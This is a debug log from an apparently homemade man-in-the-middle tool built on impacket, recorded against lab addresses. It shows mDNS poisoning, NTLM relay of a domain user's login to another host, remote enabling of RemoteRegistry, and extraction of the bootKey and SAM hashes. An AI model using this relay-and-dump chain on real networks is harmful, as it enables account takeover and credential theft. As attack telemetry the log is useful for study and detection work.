2021-10-31 09:14:21.505 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:277 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
2021-10-31 09:14:30.698 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:14:30.698 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:14:30.700 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:14:30.701 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:14:30.703 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:14:30.703 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:14:30.704 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:14:30.704 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:14:31.696 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:14:31.698 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:14:31.698 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-10-31 09:14:31.740 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:14:31.742 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:14:31.742 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-10-31 09:14:31.773 | INFO     | impacket.examples.secretsdump:getBootKey:760 - Target system bootKey: 0xa914c891db39b6910864254739800e33
2021-10-31 09:14:31.780 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:14:31.781 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:14:31.782 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:14:31.782 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:14:31.841 | INFO     | impacket.examples.secretsdump:dump:1216 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
2021-10-31 09:14:32.161 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:113 - Done dumping SAM hashes for host: 192.168.253.129
2021-10-31 09:14:32.165 | INFO     | impacket.examples.secretsdump:__restore:688 - Stopping service RemoteRegistry
2021-10-31 09:14:32.170 | INFO     | impacket.examples.secretsdump:__restore:691 - Restoring the disabled state for service RemoteRegistry
2021-10-31 09:14:33.547 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:182 - Exiting smb relay attack ...
2021-10-31 09:14:56.784 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:277 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-10-31 09:14:56.785 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
2021-10-31 09:14:56.788 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-10-31 09:14:56.790 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:88 - Starting ntlm-relay attack...
2021-10-31 09:14:56.797 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
2021-10-31 09:14:57.854 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:14:57.854 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:14:57.855 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-10-31 09:14:57.889 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:14:57.889 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:14:57.890 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-10-31 09:15:00.559 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:00.560 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:00.561 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:00.561 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:01.627 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:01.628 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:01.635 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:01.636 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:02.142 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:02.142 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:02.144 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:02.144 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:03.136 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:03.136 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:03.141 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:03.142 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:03.259 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:03.260 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:03.261 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:03.261 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:03.262 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:03.262 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:03.263 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:03.263 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:03.629 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:03.629 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:03.631 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:03.631 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:04.254 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:04.254 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:04.255 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:04.255 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:05.557 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:05.557 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:05.561 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:05.561 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:05.564 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:05.564 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:05.567 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:05.567 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:06.556 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:06.556 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:06.559 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:06.560 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:19.374 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:19.374 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:19.374 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-10-31 09:15:19.412 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:19.412 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:19.413 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-10-31 09:15:19.448 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:19.448 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:19.449 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:19.449 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:20.396 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:388 - SMBD-Thread-5: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
2021-10-31 09:15:20.511 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetup:317 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
2021-10-31 09:15:20.514 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-5: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
2021-10-31 09:15:20.538 | INFO     | impacket.examples.secretsdump:__checkServiceStatus:659 - Service RemoteRegistry is in stopped state
2021-10-31 09:15:20.546 | INFO     | impacket.examples.secretsdump:__checkServiceStatus:673 - Service RemoteRegistry is disabled, enabling it
2021-10-31 09:15:20.551 | INFO     | impacket.examples.secretsdump:__checkServiceStatus:676 - Starting service RemoteRegistry
2021-10-31 09:15:20.577 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:20.578 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:20.579 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:20.579 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:20.580 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:20.580 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:20.581 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:20.581 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:21.569 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:21.570 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:21.571 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:21.571 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:21.655 | INFO     | impacket.examples.secretsdump:getBootKey:760 - Target system bootKey: 0xa914c891db39b6910864254739800e33
2021-10-31 09:15:21.731 | INFO     | impacket.examples.secretsdump:dump:1216 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
2021-10-31 09:15:22.039 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:113 - Done dumping SAM hashes for host: 192.168.253.129
2021-10-31 09:15:22.115 | INFO     | impacket.examples.secretsdump:__restore:688 - Stopping service RemoteRegistry
2021-10-31 09:15:22.119 | INFO     | impacket.examples.secretsdump:__restore:691 - Restoring the disabled state for service RemoteRegistry
2021-10-31 09:15:27.398 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:27.398 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:27.399 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-10-31 09:15:27.432 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:27.432 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:27.433 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-10-31 09:15:27.465 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:27.465 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:27.467 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:27.467 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:27.767 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:182 - Exiting smb relay attack ...
2021-10-31 09:15:36.026 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:277 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-10-31 09:15:36.026 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
2021-10-31 09:15:36.028 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:193 - Running ntlm relay on the background the results will be saved at: [32mlogs/ntlm_relay.log[39m 
2021-10-31 09:15:36.031 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-10-31 09:15:36.032 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:85 - Starting ntlm-relay attack...
2021-10-31 09:15:36.039 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
2021-10-31 09:15:43.541 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:43.541 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:43.541 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-10-31 09:15:43.588 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:43.589 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:43.589 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-10-31 09:15:43.632 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:43.633 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:43.638 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:43.639 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:44.562 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:388 - SMBD-Thread-5: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
2021-10-31 09:15:44.582 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetup:317 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
2021-10-31 09:15:44.588 | DEBUG    | impacket.examples.ntlmrelayx.utils.targetsutils:getTarget:138 - No more targets for user RSGBENGICORP/BENJI
2021-10-31 09:15:44.588 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-5: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
2021-10-31 09:15:44.610 | INFO     | impacket.examples.secretsdump:__checkServiceStatus:659 - Service RemoteRegistry is in stopped state
2021-10-31 09:15:44.621 | INFO     | impacket.examples.secretsdump:__checkServiceStatus:673 - Service RemoteRegistry is disabled, enabling it
2021-10-31 09:15:44.626 | INFO     | impacket.examples.secretsdump:__checkServiceStatus:676 - Starting service RemoteRegistry
2021-10-31 09:15:45.279 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:45.279 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:45.280 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:45.280 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:45.281 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:45.282 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:45.283 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 09:15:45.283 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 09:15:45.644 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for JD
2021-10-31 09:15:45.653 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for Skew1
2021-10-31 09:15:45.670 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for GBG
2021-10-31 09:15:45.684 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for Data
2021-10-31 09:15:45.699 | INFO     | impacket.examples.secretsdump:getBootKey:760 - Target system bootKey: 0xa914c891db39b6910864254739800e33
2021-10-31 09:15:45.699 | DEBUG    | impacket.examples.secretsdump:saveSAM:800 - Saving remote SAM database
2021-10-31 09:15:45.772 | INFO     | impacket.examples.secretsdump:dump:1216 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
2021-10-31 09:15:45.772 | DEBUG    | impacket.examples.secretsdump:getHBootKey:1161 - Calculating HashedBootKey from SAM
2021-10-31 09:15:45.874 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 09:15:45.915 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 09:15:45.966 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
